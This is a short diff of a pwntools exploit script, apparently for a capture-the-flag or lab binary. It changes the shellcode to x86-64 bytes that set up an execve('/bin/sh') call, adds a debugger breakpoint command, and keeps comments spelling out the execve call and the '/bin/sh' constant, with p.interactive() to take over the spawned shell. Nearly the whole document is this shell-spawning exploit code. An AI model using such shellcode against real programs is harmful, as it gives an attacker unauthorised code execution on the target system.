@@ -1,8 +1,9 @@
 from pwn import *
 
 COMMANDS = """
+xuntil 0x40123f
 """
-shellcode = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00"
+shellcode = b"\x6A\x3B\x58\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x54\x5F"
 
 
 
@@ -19,3 +20,4 @@ p.interactive()
 
 #execve("/bin/sh\0", NULL, NULL)
 #0x0068732f6e69622f
+
